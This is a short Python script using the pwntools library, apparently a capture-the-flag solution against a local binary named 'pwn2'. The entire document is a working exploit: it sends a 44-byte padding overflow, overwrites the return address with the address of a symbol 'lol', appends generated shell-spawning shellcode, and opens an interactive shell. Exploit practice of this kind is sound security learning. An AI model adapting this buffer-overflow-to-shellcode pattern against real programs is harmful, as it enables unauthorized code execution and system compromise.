from pwn import *

p = process("./pwn2")
elf = ELF("./pwn2")
addr = elf.symbols["lol"]
shell_code = asm(shellcraft.sh())
offset = 44
p.sendline(b"A" * offset + p32(addr) + shell_code)
p.interactive()